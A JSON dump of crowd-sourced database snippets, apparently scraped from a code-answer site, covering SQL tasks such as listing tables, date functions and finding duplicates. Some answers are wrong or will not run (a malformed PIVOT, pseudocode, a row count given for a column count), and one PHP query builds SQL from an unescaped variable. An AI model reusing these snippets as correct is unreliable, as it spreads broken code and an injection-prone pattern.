    "description": "CREATE FUNCTION function_name &hellip; RETURN BOOLEAN IS \tDefinitions; BEGIN \tStatement; \tRETURN \"Hello World!\"; END;\nCREATE OR REPLACE FUNCTION my_schema.my_function(param1 IN number) RETURN output1 IS     cnumber NUMBER; BEGIN     cnumber := 2;     RETURN (cnumber * param1); EXCEPTION     WHEN OTHERS THEN         raise_application_error(-20001, 'An error was encountered - '             || sqlcode || ' -ERROR- ' || sqlerrm); END;\n",
    "reg_date": "2021-10-12T09:55:22.000Z"
  },
  {
    "id": 1061,
    "keyword": null,
    "link": null,
    "title": " function plsql",
    "description": "CREATE FUNCTION function_name &hellip; RETURN BOOLEAN IS \tDefinitions; BEGIN \tStatement; \tRETURN \"Hello World!\"; END;\nCREATE OR REPLACE FUNCTION my_schema.my_function(param1 IN number) RETURN output1 IS     cnumber NUMBER; BEGIN     cnumber := 2;     RETURN (cnumber * param1); EXCEPTION     WHEN OTHERS THEN         raise_application_error(-20001, 'An error was encountered - '             || sqlcode || ' -ERROR- ' || sqlerrm); END;\n",
    "reg_date": "2021-10-12T09:55:22.000Z"
  },
  {
    "id": 1062,
    "keyword": null,
    "link": null,
    "title": " function to remove special characters in sql",
    "description": "Create function [dbo].[RemoveCharSpecialSymbolValue](@str varchar(500))   returns varchar(500)   begin   declare @startingIndex int   set @startingIndex=0   while 1=1   begin   set @startingIndex= patindex('%[^0-9.]%',@str)   if @startingIndex <> 0   begin   set @str = replace(@str,substring(@str,@startingIndex,1),'')   end   else break;   end   return @str   end   \n",
    "reg_date": "2021-10-12T09:55:22.000Z"
  },
  {
    "id": 1063,
    "keyword": null,
    "link": null,
    "title": " functions with parameters SQL",
    "description": "USE tempdb; GO  DROP FUNCTION IF EXISTS dbo.GetOrderID; DROP TABLE IF EXISTS OrdersTest; GO  CREATE TABLE OrdersTest (OrderID int IDENTITY, OrderType int, Qty int, ServiceSpeed int); GO  CREATE FUNCTION GetOrderID ( \t@OrderType int = 0, \t@ServiceSpeed int = 0, \t@Qty int = 0 ) RETURNS int AS BEGIN \tRETURN \t( \t\tSELECT \t\t\tTOP 1 OrderID \t\tFROM\t\tOrdersTest \t\tWHERE\t\tOrderType = @OrderType \t\tAND\t\t\tServiceSpeed = @ServiceSpeed \t\tAND\t\t\tQty = @Qty \t\t \t); END GO \nSET @OrderID = dbo.GetOrderID (default, default, default); \nDECLARE \t@OrderID int = NULL, \t@OrderType int = 1, \t@Qty int = 2, \t@ServiceSpeed int = 3;  INSERT INTO OrdersTest (OrderType, Qty, ServiceSpeed) \tVALUES (@OrderType, @Qty, @ServiceSpeed);  EXEC @OrderID = dbo.GetOrderID \t@OrderType = @OrderType, \t@Qty = @Qty, \t@ServiceSpeed = @ServiceSpeed;  SELECT @OrderID 'Using EXEC Syntax'; \nEXEC @OrderID = dbo.GetOrderID \t@OrderType = @OrderType, \t@ServiceSpeed = @Qty, \t@Qty = @ServiceSpeed; \n",
    "reg_date": "2021-10-12T09:55:22.000Z"
  },
  {
    "id": 1064,
    "keyword": null,
    "link": null,
    "title": " funzioni plsql",
    "description": "CREATE FUNCTION nome_funzione &hellip; RETURN BOOLEAN IS \tDefinizioni; BEGIN \tCorpo procedura; \tRETURN Variabile; END;\n",
    "reg_date": "2021-10-12T09:55:23.000Z"
  },
  {
    "id": 1065,
    "keyword": null,
    "link": null,
    "title": " gcloud check sql",
    "description": "#Just type in following to check sql DB instances gcloud sql instances list\n",
    "reg_date": "2021-10-12T09:55:23.000Z"
  },
  {
    "id": 1066,
    "keyword": null,
    "link": null,
    "title": " gcloud sql instance list",
    "description": "#Just type in following to check sql DB instances gcloud sql instances list\n",
    "reg_date": "2021-10-12T09:55:23.000Z"
  },
  {
    "id": 1067,
    "keyword": null,
    "link": null,
    "title": " gcloud sql list databases",
    "description": "#Just type in following to check sql DB instances gcloud sql instances list\n",
    "reg_date": "2021-10-12T09:55:23.000Z"
  },
  {
    "id": 1068,
    "keyword": null,
    "link": null,
    "title": " generate c# class from sql server table",
    "description": "declare @TableName sysname = 'TableName' declare @Result varchar(max) = 'public class ' + @TableName + ' {'  select @Result = @Result + '     public ' + ColumnType + NullableSign + ' ' + ColumnName + ' { get; set; } ' from (     select          replace(col.name, ' ', '_') ColumnName,         column_id ColumnId,         case typ.name              when 'bigint' then 'long'             when 'binary' then 'byte[]'             when 'bit' then 'bool'             when 'char' then 'string'             when 'date' then 'DateTime'             when 'datetime' then 'DateTime'             when 'datetime2' then 'DateTime'             when 'datetimeoffset' then 'DateTimeOffset'             when 'decimal' then 'decimal'             when 'float' then 'double'             when 'image' then 'byte[]'             when 'int' then 'int'             when 'money' then 'decimal'             when 'nchar' then 'string'             when 'ntext' then 'string'             when 'numeric' then 'decimal'             when 'nvarchar' then 'string'             when 'real' then 'float'             when 'smalldatetime' then 'DateTime'             when 'smallint' then 'short'             when 'smallmoney' then 'decimal'             when 'text' then 'string'             when 'time' then 'TimeSpan'             when 'timestamp' then 'long'             when 'tinyint' then 'byte'             when 'uniqueidentifier' then 'Guid'             when 'varbinary' then 'byte[]'             when 'varchar' then 'string'             else 'UNKNOWN_' + typ.name         end ColumnType,         case              when col.is_nullable = 1 and typ.name in ('bigint', 'bit', 'date', 'datetime', 'datetime2', 'datetimeoffset', 'decimal', 'float', 'int', 'money', 'numeric', 'real', 'smalldatetime', 'smallint', 'smallmoney', 'time', 'tinyint', 'uniqueidentifier')              then '?'              else ''          end NullableSign     from sys.columns col         join sys.types typ on             col.system_type_id = typ.system_type_id AND col.user_type_id = typ.user_type_id     where object_id = object_id(@TableName) ) t order by ColumnId  set @Result = @Result  + ' }'  print @Result \n",
    "reg_date": "2021-10-12T09:55:23.000Z"
  },
  {
    "id": 1069,
    "keyword": null,
    "link": null,
    "title": " generate random & unique mysql string",
    "description": "DO      SELECT LEFT(UUID(), 8) INTO @var;     INSERT INTO col (@var); WHILE there_is_a_unique_constraint_violation\n",
    "reg_date": "2021-10-12T09:55:23.000Z"
  },
  {
    "id": 1070,
    "keyword": null,
    "link": null,
    "title": " generate random data postgresql",
    "description": "insert into towns (     code, article, name, department ) select     left(md5(i::text), 10),     md5(random()::text),     md5(random()::text),     left(md5(random()::text), 4) from generate_series(1, 1000000) s(i) \n",
    "reg_date": "2021-10-12T09:55:23.000Z"
  },
  {
    "id": 1071,
    "keyword": null,
    "link": null,
    "title": " generate sequence number in sql server",
    "description": "SELECT SeqNum= RIGHT('00000'+ CAST(1 AS VARCHAR(5)),5)\n",
    "reg_date": "2021-10-12T09:55:23.000Z"
  },
  {
    "id": 1072,
    "keyword": null,
    "link": null,
    "title": " get a row where have list of array in SQL",
    "description": "CREATE TABLE my_table (     id serial PRIMARY KEY,     numbers INT [] );  INSERT INTO my_table (numbers) VALUES ('{2, 3, 4}'); INSERT INTO my_table (numbers) VALUES ('{2, 1, 4}');  -- which means -- test=# select * from my_table;  id | numbers  ----+---------   1 | {2,3,4}   2 | {2,1,4} (2 rows)   To check if an array contains parts of another array, you would use the && operator  && -- overlap (have elements in common) -- ARRAY[1,4,3] && ARRAY[2,1] --> true  SELECT * FROM my_table WHERE numbers && '{1,2}'::int[]; To check if an array contains all members of another array, you would use the @> operator  @> -- contains -- ARRAY[1,4,3] @> ARRAY[3,1] --> true  SELECT * FROM my_table WHERE numbers @> '{1,2}'::int[];\n",
    "reg_date": "2021-10-12T09:55:23.000Z"
  },
  {
    "id": 1073,
    "keyword": null,
    "link": null,
    "title": " get all columns from table sql",
    "description": "/*Get all columns from a table (sql server)*/ SELECT * FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'table name';\n/* To retreive the column names of table using sql */  SELECT COLUMN_NAME. FROM INFORMATION_SCHEMA. COLUMNS. WHERE TABLE_NAME = 'Your Table Name'\nSELECT   \tTABLE_NAME FROM   \tINFORMATION_SCHEMA.TABLES \n",
    "reg_date": "2021-10-12T09:55:23.000Z"
  },
  {
    "id": 1074,
    "keyword": null,
    "link": null,
    "title": " get all db sizes in mysql server",
    "description": "SELECT table_schema \"DB Name\",         ROUND(SUM(data_length + index_length) / 1024 / 1024, 1) \"DB Size in MB\"  FROM information_schema.tables  GROUP BY table_schema; \n",
    "reg_date": "2021-10-12T09:55:24.000Z"
  },
  {
    "id": 1075,
    "keyword": null,
    "link": null,
    "title": " get all employee of salary if more than in sql",
    "description": "SELECT * FROM EMPLOYEES WHERE SALARY > 10000;\n",
    "reg_date": "2021-10-12T09:55:24.000Z"
  },
  {
    "id": 1076,
    "keyword": null,
    "link": null,
    "title": " get all name uppercase in sql",
    "description": "SELECT UPPER(FIRST_NAME) , LOWER(LAST_NAME) FROM CUSTOMERS ;\n",
    "reg_date": "2021-10-12T09:55:24.000Z"
  },
  {
    "id": 1077,
    "keyword": null,
    "link": null,
    "title": " get all table name in sql through php",
    "description": "show tables; \n",
    "reg_date": "2021-10-12T09:55:24.000Z"
  },
  {
    "id": 1078,
    "keyword": null,
    "link": null,
    "title": " get all tables postgres",
    "description": "SELECT * FROM pg_catalog.pg_tables; \nPostgreSQL show tables command \t \\dt\n\\dt # show list of tables in postgres\npostgres=# \\d tablename;\n",
    "reg_date": "2021-10-12T09:55:24.000Z"
  },
  {
    "id": 1079,
    "keyword": null,
    "link": null,
    "title": " get all tables using like",
    "description": "select * from sys.tables where name like '%tablename%' \nSELECT * FROM INFORMATION_SCHEMA.TABLES  WHERE TABLE_NAME LIKE '%%' \n",
    "reg_date": "2021-10-12T09:55:24.000Z"
  },
  {
    "id": 1080,
    "keyword": null,
    "link": null,
    "title": " get clob size oracle",
    "description": "SELECT (DBMS_LOB.getlength(your_column_name))/1024/1024 AS SizeMB FROM your_table\n",
    "reg_date": "2021-10-12T09:55:24.000Z"
  },
  {
    "id": 1081,
    "keyword": null,
    "link": null,
    "title": " get column name sql server",
    "description": "SELECT * FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = N'Customers'\n",
    "reg_date": "2021-10-12T09:55:24.000Z"
  },
  {
    "id": 1082,
    "keyword": null,
    "link": null,
    "title": " get columns number sql",
    "description": "#With SQL  SELECT count(*) FROM information_schema.columns WHERE table_name = 'Your_table_name'; \n//With JAVA  String quer=\"SELECT * FROM sample2 where 1=2\";  Statement st=con.createStatement(); ResultSet rs=st.executeQuery(quer); ResultSetMetaData rsmd = rs.getMetaData(); int NumOfCol=0; NumOfCol=rsmd.getColumnCount(); System.out.println(\"Query Executed!! No of Colm=\"+NumOfCol);\nSELECT TABLE_NAME , count(COLUMN_NAME) FROM information_schema.columns GROUP BY TABLE_NAME;  -- Oracle (depending on schema grants): SELECT count(*) FROM USER_TAB_COLS WHERE TABLE_NAME = 'my_table'; SELECT count(*) FROM ALL_TAB_COLS WHERE TABLE_NAME = 'my_table'; SELECT count(*) FROM DBA_TAB_COLS WHERE TABLE_NAME = 'my_table';\n",
    "reg_date": "2021-10-12T09:55:24.000Z"
  },
  {
    "id": 1083,
    "keyword": null,
    "link": null,
    "title": " get count by weekly pivot table sql server",
    "description": "  SELECT Depots.Name AS 'Depot',  Account.Name, '22/01/2012',  '29/01/2012',  '05/02/2012',  '12/02/2012',    FROM  (SELECT Name,      FROM Deliveries     INNER JOIN Account ON Deliveries.Customer = Account.ID     INNER JOIN Depots ON Account.CollectionDepot) AS Source PIVOT (     SUM(Deliveries.Rates)     FOR Date IN ('22/01/2012',  '29/01/2012',  '05/02/2012',  '12/02/2012') ) AS 'Pivot Table' \n",
    "reg_date": "2021-10-12T09:55:24.000Z"
  },
  {
    "id": 1084,
    "keyword": null,
    "link": null,
    "title": " get count of duplicate records",
    "description": "SELECT name, COUNT(email)  FROM users GROUP BY email HAVING COUNT(email) > 1\nSELECT [CaseNumber], COUNT(*) AS Occurrences FROM [CaseCountry] GROUP BY [CaseNumber] HAVING (COUNT(*) > 1)\nSELECT      col,      COUNT(col) FROM     table_name GROUP BY col HAVING COUNT(col) > 1;\n",
    "reg_date": "2021-10-12T09:55:25.000Z"
  },
  {
    "id": 1085,
    "keyword": null,
    "link": null,
    "title": " get create table query existing table mysql",
    "description": "SHOW CREATE TABLE tablename \nCopied mysql> SHOW CREATE TABLE t\\G *************************** 1. row ***************************        Table: t Create Table: CREATE TABLE `t` (   `id` int(11) NOT NULL AUTO_INCREMENT,   `s` char(60) DEFAULT NULL,   PRIMARY KEY (`id`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4\n",
    "reg_date": "2021-10-12T09:55:25.000Z"
  },
  {
    "id": 1086,
    "keyword": null,
    "link": null,
    "title": " get current date in pyspark sql",
    "description": "%pyspark  from pyspark.sql.functions import current_date df1 = df.withColumn(\"current_date\",current_date())  #Where df1 is that dataset you want to add the current date to.\n",
    "reg_date": "2021-10-12T09:55:25.000Z"
  },
  {
    "id": 1087,
    "keyword": null,
    "link": null,
    "title": " get current date sql",
    "description": "GETDATE() \nSELECT getdate(); -- Get Current date in SQL Server\nGETDATE()\nAdd GETDATE() in sql query where you want to pass current timestamp.  Example Return the current database system date and time:  SELECT GETDATE();\nNOW()\nSELECT CURRENT_DATE from dual;\n",
    "reg_date": "2021-10-12T09:55:25.000Z"
  },
  {
    "id": 1088,
    "keyword": null,
    "link": null,
    "title": " get current month last date in sql server",
    "description": "SELECT EOMONTH('2019-02-15') end_of_month_feb2019; \n",
    "reg_date": "2021-10-12T09:55:25.000Z"
  },
  {
    "id": 1089,
    "keyword": null,
    "link": null,
    "title": " get current year sql",
    "description": "select year(getdate())\n-- Oracle SELECT extract(YEAR FROM sysdate) FROM dual;\t\t\t// number SELECT to_char(sysdate, 'YYYY') FROM dual;\t\t\t\t// varchar\n",
    "reg_date": "2021-10-12T09:55:25.000Z"
  },
  {
    "id": 1090,
    "keyword": null,
    "link": null,
    "title": " get database size mysql",
    "description": "SELECT table_schema \"DB Name\",         ROUND(SUM(data_length + index_length) / 1024 / 1024, 1) \"DB Size in MB\"  FROM information_schema.tables  GROUP BY table_schema;  \nSELECT table_schema \"DB Name\",         ROUND(SUM(data_length + index_length) / 1024 / 1024, 1) \"DB Size in MB\"  FROM information_schema.tables  GROUP BY table_schema; \n",
    "reg_date": "2021-10-12T09:55:25.000Z"
  },
  {
    "id": 1091,
    "keyword": null,
    "link": null,
    "title": " get date ISO in psql",
    "description": "SELECT cast(to_char (now()::timestamp at time zone 'UTC', 'YYYY-MM-DD\"T\"HH24:MI:SS\"Z\"') as varchar)\n",
    "reg_date": "2021-10-12T09:55:25.000Z"
  },
  {
    "id": 1092,
    "keyword": null,
    "link": null,
    "title": " get date from now() mysql",
    "description": "You can use CURDATE()\nIn MySQL the CURDATE() returns the current date in 'YYYY-MM-DD' format or 'YYYYMMDD' format depending on whether numeric or string is used in the function. CURRENT_DATE and CURRENT_DATE() are the synonym of CURDATE()\n",
    "reg_date": "2021-10-12T09:55:25.000Z"
  },
  {
    "id": 1093,
    "keyword": null,
    "link": null,
    "title": " get date from timestamp in mysql",
    "description": "SELECT DATE_FORMAT('2013-11-26 01:24:34', '%Y-%m-%d'); > 2013-11-26 \n",
    "reg_date": "2021-10-12T09:55:25.000Z"
  },
  {
    "id": 1094,
    "keyword": null,
    "link": null,
    "title": " get day in sql",
    "description": "SELECT DATEPART(m, GETDATE()) as theMonth  -- returns 11 SELECT DATEPART(d, GETDATE()) as theDay   -- returns 20 SELECT DATEPART(yy, GETDATE()) as theYear   -- returns 2013\nextract(dow from payment_date)\n",
    "reg_date": "2021-10-12T09:55:25.000Z"
  },
  {
    "id": 1095,
    "keyword": null,
    "link": null,
    "title": " get ddl materialized view oracle",
    "description": "-- Views (use USER_VIEWS or DBA_VIEWS if needed): SELECT TEXT FROM ALL_VIEWS WHERE upper(VIEW_NAME) LIKE upper('%VIEW_NAME%'); -- Or: SELECT dbms_metadata.get_ddl('VIEW', 'VIEW_NAME', 'OWNER_NAME') FROM DUAL;  -- Materialized views (use USER_VIEWS or DBA_VIEWS if needed): SELECT QUERY FROM ALL_MVIEWS WHERE upper(MVIEW_NAME) LIKE upper('%VIEW_NAME%'); -- Or: SELECT dbms_metadata.get_ddl('MATERIALIZED_VIEW', 'VIEW_NAME', 'OWNER_NAME')  FROM DUAL;\n",
    "reg_date": "2021-10-12T09:55:26.000Z"
  },
  {
    "id": 1096,
    "keyword": null,
    "link": null,
    "title": " get duplicate records in sql",
    "description": "SELECT username, email, COUNT(*) FROM users GROUP BY username, email HAVING COUNT(*) > 1 \nSELECT name, COUNT(email)  FROM users GROUP BY email HAVING COUNT(email) > 1\nSELECT _column, COUNT(*)  FROM _table GROUP BY _column HAVING COUNT(*) > 1\nSELECT [CaseNumber], COUNT(*) AS Occurrences FROM [CaseCountry] GROUP BY [CaseNumber] HAVING (COUNT(*) > 1)\n/* Gets reps */ SELECT fieldA, COUNT(*) FROM tableA GROUP BY fieldA HAVING COUNT(*) > 1  /* Use reps to filter results */ SELECT a.* FROM tableA a JOIN ( \tSELECT fieldA, COUNT(*) as 'count' \tFROM tableA \tGROUP BY fieldA \tHAVING COUNT(*) > 1 ) b ON a.fieldA = b.fieldA \nMultiple field= SELECT username, email, COUNT(*) FROM users GROUP BY username, email HAVING COUNT(*) > 1  Single field= SELECT _column, COUNT(*)  FROM _table GROUP BY _column HAVING COUNT(*) > 1\n",
    "reg_date": "2021-10-12T09:55:26.000Z"
  },
  {
    "id": 1097,
    "keyword": null,
    "link": null,
    "title": " get first 2 letter in sql",
    "description": "SELECT FIRST_NAME ,  SUBSTR(FIRST_NAME, 1 , 3 ) , LENGTH(FIRST_NAME) FROM EMPLOYEES ; \n",
    "reg_date": "2021-10-12T09:55:26.000Z"
  },
  {
    "id": 1098,
    "keyword": null,
    "link": null,
    "title": " get first 3 letter of department name in sql",
    "description": "SELECT FIRST_NAME ,  SUBSTR(FIRST_NAME, 1 , 3 ) , LENGTH(FIRST_NAME) FROM EMPLOYEES ; \n",
    "reg_date": "2021-10-12T09:55:26.000Z"
  },
  {
    "id": 1099,
    "keyword": null,
    "link": null,
    "title": " get first 3 letters in sql",
    "description": "SELECT FIRST_NAME ,  SUBSTR(FIRST_NAME, 1 , 3 ) , LENGTH(FIRST_NAME) FROM EMPLOYEES ; \n-- substr(string, start, [, length ]) SELECT substr('Hello World', 1, 3) ;      -- Hel SELECT substr('Hello World', 4, 5) ;      -- lo Wo SELECT substr('Hello World', 4);          -- lo World SELECT substr('Hello World', -3);         -- rld\n",
    "reg_date": "2021-10-12T09:55:26.000Z"
  },
  {
    "id": 1100,
    "keyword": null,
    "link": null,
    "title": " get first 3 letters name  in sql",
    "description": "SELECT FIRST_NAME ,  SUBSTR(FIRST_NAME, 1 , 3 ) , LENGTH(FIRST_NAME) FROM EMPLOYEES ; \n",
    "reg_date": "2021-10-12T09:55:26.000Z"
  },
  {
    "id": 1101,
    "keyword": null,
    "link": null,
    "title": " get first monday of month sql",
    "description": "select DATEADD(wk, DATEDIFF(wk,0,             dateadd(dd,6-datepart(day,getdate()),getdate())                                ), 0)   --Change getdate to your variable\n",
    "reg_date": "2021-10-12T09:55:26.000Z"
  },
  {
    "id": 1102,
    "keyword": null,
    "link": null,
    "title": " get first n letter of department name in sql",
    "description": "SELECT FIRST_NAME ,  SUBSTR(FIRST_NAME, 1 , 3 ) , LENGTH(FIRST_NAME) FROM EMPLOYEES ; \n",
    "reg_date": "2021-10-12T09:55:26.000Z"
  },
  {
    "id": 1103,
    "keyword": null,
    "link": null,
    "title": " get from database the most recent data limit by 5",
    "description": "$result = mysql_query(\"SELECT * FROM notes WHERE note_author_id='$u_id' ORDER BY date_time DESC LIMIT 0, 10\"); \n",
    "reg_date": "2021-10-12T09:55:26.000Z"
  },
  {
    "id": 1104,
    "keyword": null,
    "link": null,
    "title": " get hour from date sql",
    "description": "SELECT DATEPART(HOUR, GETDATE());\n",
    "reg_date": "2021-10-12T09:55:26.000Z"
  },
  {
    "id": 1105,
    "keyword": null,
    "link": null,
    "title": " get initial in sql",
    "description": "SELECT UPPER(FIRST_NAME) , LOWER(LAST_NAME)          , SUBSTR(FIRST_NAME , 1,1) || SUBSTR(LAST_NAME , 1,1)  AS INITIALS FROM EMPLOYEES ; \n",
    "reg_date": "2021-10-12T09:55:26.000Z"
  },
  {
    "id": 1106,
    "keyword": null,
    "link": null,
    "title": " get initials name in sql",
    "description": "SELECT UPPER(FIRST_NAME) , LOWER(LAST_NAME)          , SUBSTR(FIRST_NAME , 1,1) || SUBSTR(LAST_NAME , 1,1)  AS INITIALS FROM EMPLOYEES ; \n",
    "reg_date": "2021-10-12T09:55:27.000Z"
  },
  {
    "id": 1107,
    "keyword": null,
    "link": null,
    "title": " get last inserted primary key",
    "description": "INSERT INTO dbo.Table(columns) OUTPUT INSERTED.p_key, INSERTED.someothercolumnhere ....... VALUES(...)  \n",
    "reg_date": "2021-10-12T09:55:27.000Z"
  },
  {
    "id": 1108,
    "keyword": null,
    "link": null,
    "title": " get last record in sql",
    "description": "mysql> select *from getLastRecord ORDER BY id DESC LIMIT 1;\nSELECT TOP 1 * FROM Table ORDER BY ID DESC \nSELECT * FROM TableName WHERE id=(SELECT max(id) FROM TableName); \nSELECT   (SELECT * FROM tableName ORDER BY col1 LIMIT 1)        AS first,   (SELECT * FROM tableName ORDER BY col1 DESC LIMIT 1)   AS last ;\n\tSelect Distinct names.xyz        From nameList names        LEFT JOIN nameList idNum        ON idNum.xyz > names.xyz AND idNum.xyz IS NOT NULL        WHERE idNum.xyz IS NULL \n",
    "reg_date": "2021-10-12T09:55:27.000Z"
  },
  {
    "id": 1109,
    "keyword": null,
    "link": null,
    "title": " get last three characters in mysql column",
    "description": "SELECT NAME FROM STUDENTS WHERE MARKS > 75 ORDER BY SUBSTRING(NAME,-3), ID; \n",
    "reg_date": "2021-10-12T09:55:27.000Z"
  },
  {
    "id": 1110,
    "keyword": null,
    "link": null,
    "title": " get latest record in sql",
    "description": "ex: SELECT TOP 1 * FROM [TABLENAME] ORDER BY id DESC\n",
    "reg_date": "2021-10-12T09:55:27.000Z"
  },
  {
    "id": 1111,
    "keyword": null,
    "link": null,
    "title": " get manager if not null in sql",
    "description": "SELECT FIRST_NAME , MANAGER_ID  FROM EMPLOYEES  WHERE MANAGER_ID IS NOT NULL ;\n",
    "reg_date": "2021-10-12T09:55:27.000Z"
  },
  {
    "id": 1112,
    "keyword": null,
    "link": null,
    "title": " get max salary from each department sql",
    "description": "--Find out the name of top earner in each departments --Output has Name, Department name and max salary of the department  SELECT E.FIRST_NAME , D.DEPARTMENT_NAME, E.SALARY FROM EMPLOYEES E JOIN DEPARTMENTS D ON E.DEPARTMENT_ID = D.DEPARTMENT_ID WHERE SALARY IN(SELECT MAX(E.SALARY) FROM EMPLOYEES E JOIN DEPARTMENTS D ON E.DEPARTMENT_ID = D.DEPARTMENT_ID GROUP BY DEPARTMENT_NAME);\nSELECT firstname, MAX(salary) FROM department d LEFT OUTER JOIN employee e ON (d.department_id = e.department_id) GROUP BY department_id; \nSELECT salary, first_name, last_name FROM employees ORDER BY salary DESC LIMIT 3;\n",
    "reg_date": "2021-10-12T09:55:27.000Z"
  },
  {
    "id": 1113,
    "keyword": null,
    "link": null,
    "title": " get number of rows from sql array using java",
    "description": "select count(1) from Table_Name;\n",
    "reg_date": "2021-10-12T09:55:27.000Z"
  },
  {
    "id": 1114,
    "keyword": null,
    "link": null,
    "title": " get number of rows in every table mysql",
    "description": "mysql> SELECT table_name, table_rows    ->FROM INFORMATION_SCHEMA.TABLES    ->WHERE TABLE_SCHEMA = 'business';\n",
    "reg_date": "2021-10-12T09:55:27.000Z"
  },
  {
    "id": 1115,
    "keyword": null,
    "link": null,
    "title": " get number of table colums in sql query",
    "description": "select count(*) from tablename\n",
    "reg_date": "2021-10-12T09:55:28.000Z"
  },
  {
    "id": 1116,
    "keyword": null,
    "link": null,
    "title": " get only structure database mysql",
    "description": "mysqldump -u root -p --no-data dbname > schema.sql\n",
    "reg_date": "2021-10-12T09:55:28.000Z"
  },
  {
    "id": 1117,
    "keyword": null,
    "link": null,
    "title": " get parameter value in mysql trigger",
    "description": "NEW.field_name or OLD.field_name\n",
    "reg_date": "2021-10-12T09:55:28.000Z"
  },
  {
    "id": 1118,
    "keyword": null,
    "link": null,
    "title": " get primary key of table",
    "description": "SELECT a.COLUMN_NAME FROM all_cons_columns a INNER JOIN all_constraints c       ON a.constraint_name = c.constraint_name  WHERE c.table_name = 'TBL'   AND c.constraint_type = 'P';\n",
    "reg_date": "2021-10-12T09:55:28.000Z"
  },
  {
    "id": 1119,
    "keyword": null,
    "link": null,
    "title": " get record which is available in one table but not in another mysql",
    "description": "SELECT  * FROM    Call WHERE   phone_number NOT IN (SELECT phone_number FROM Phone_book)\n",
    "reg_date": "2021-10-12T09:55:28.000Z"
  },
  {
    "id": 1120,
    "keyword": null,
    "link": null,
    "title": " get records in sql according to month name and count",
    "description": "SELECT EXTRACT(month FROM dateofappointment) \"Month\", count(*) FROM appointment WHERE EXTRACT(YEAR FROM dateofappointment) = '2014' GROUP BY EXTRACT(month FROM dateofappointment) ORDER BY EXTRACT(month FROM dateofappointment);\n",
    "reg_date": "2021-10-12T09:55:28.000Z"
  },
  {
    "id": 1121,
    "keyword": null,
    "link": null,
    "title": " get role postgres",
    "description": "SELECT rolname FROM pg_roles; \n",
    "reg_date": "2021-10-12T09:55:28.000Z"
  },
  {
    "id": 1122,
    "keyword": null,
    "link": null,
    "title": " get row number in mysql 5.5",
    "description": "                                     set @row_number := 0;  SELECT      @row_number:=CASE         WHEN @customer_no = customerNumber  \t\t\tTHEN @row_number + 1         ELSE 1     END AS num,     @customer_no:=customerNumber customerNumber,     paymentDate,     amount FROM     payments ORDER BY customerNumber;\n",
    "reg_date": "2021-10-12T09:55:28.000Z"
  },
  {
    "id": 1123,
    "keyword": null,
    "link": null,
    "title": " get schema of table sql",
    "description": "SELECT `table_schema`  FROM `information_schema`.`tables`  WHERE `table_name` = 'whatever';\n",
    "reg_date": "2021-10-12T09:55:28.000Z"
  },
  {
    "id": 1124,
    "keyword": null,
    "link": null,
    "title": " get substract count sql",
    "description": "select  Count(City) - Count(Distinct(City)) from Station;\n",
    "reg_date": "2021-10-12T09:55:28.000Z"
  },
  {
    "id": 1125,
    "keyword": null,
    "link": null,
    "title": " get sum sqlite android",
    "description": " Cursor cursor = db.rawQuery(\"SELECT SUM(\" + DbHelper.CART_TOTAL + \") as Total FROM \" + DbHelper.CART_TABLE, null);   if (cur.moveToFirst()) {   int total = cursor.getInt(cursor.getColumnIndex(\"Total\"));// get final total\n",
    "reg_date": "2021-10-12T09:55:28.000Z"
  },
  {
    "id": 1126,
    "keyword": null,
    "link": null,
    "title": " get table column names sql laravel",
    "description": "use Illuminate\\Support\\Facades\\Schema;  use Illuminate\\Support\\Facades\\DB;  public function getTableColumns($table) {     return DB::getSchemaBuilder()->getColumnListing($table);      // OR      return Schema::getColumnListing($table);  } \nSchema::getColumnListing($table);\n",
    "reg_date": "2021-10-12T09:55:29.000Z"
  },
  {
    "id": 1127,
    "keyword": null,
    "link": null,
    "title": " get table column names sql ssms",
    "description": "SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'Your Table Name' ORDER BY COLUMN_NAME  -- IS_NULLABLE returns yes or no depending on null or not null\n",
    "reg_date": "2021-10-12T09:55:29.000Z"
  },
  {
    "id": 1128,
    "keyword": null,
    "link": null,
    "title": " get table columns from sql",
    "description": "SELECT * FROM INFORMATION_SCHEMA.COLUMNS  WHERE TABLE_NAME = N'Customers'  -- INFORMATION_SCHEMA is an ANSI-standard (American National Standard Institute) set of read-only views which provide information about all of the tables, views, columns, and procedures in a database -- \"N\" defines the subsequent string (the string after the N) as being in unicode\n",
    "reg_date": "2021-10-12T09:55:29.000Z"
  },
  {
    "id": 1129,
    "keyword": null,
    "link": null,
    "title": " get table which have specific columns in mysql",
    "description": "SELECT DISTINCT TABLE_NAME      FROM INFORMATION_SCHEMA.COLUMNS     WHERE COLUMN_NAME IN ('columnA','ColumnB')         AND TABLE_SCHEMA='YourDatabase';\n",
    "reg_date": "2021-10-12T09:55:29.000Z"
  },
  {
    "id": 1130,
    "keyword": null,
    "link": null,
    "title": " get tables in database sql",
    "description": "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE' AND TABLE_CATALOG='YOUR_Database_name'\nSELECT   * FROM   INFORMATION_SCHEMA.TABLES; \n",
    "reg_date": "2021-10-12T09:55:29.000Z"
  },
  {
    "id": 1131,
    "keyword": null,
    "link": null,
    "title": " get the list of all tables in sql server",
    "description": "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE' AND TABLE_CATALOG='YOUR_Database_name'\nBY LOVE SINGH  SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE' AND TABLE_CATALOG='YOUR_Database_name'\nBY LOVE SINGH on May 19 2020  SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE' AND TABLE_CATALOG='YOUR_Database_name'\n",
    "reg_date": "2021-10-12T09:55:29.000Z"
  },
  {
    "id": 1132,
    "keyword": null,
    "link": null,
    "title": " get the mysql table columns data type mysql",
    "description": "SHOW COLUMNS FROM mydb.mytable;\n",
    "reg_date": "2021-10-12T09:55:29.000Z"
  },
  {
    "id": 1133,
    "keyword": null,
    "link": null,
    "title": " get time component of datetime sql",
    "description": "SELECT convert(varchar(8), getdate(), 108)\n",
    "reg_date": "2021-10-12T09:55:29.000Z"
  },
  {
    "id": 1134,
    "keyword": null,
    "link": null,
    "title": " get value comma separated sql server",
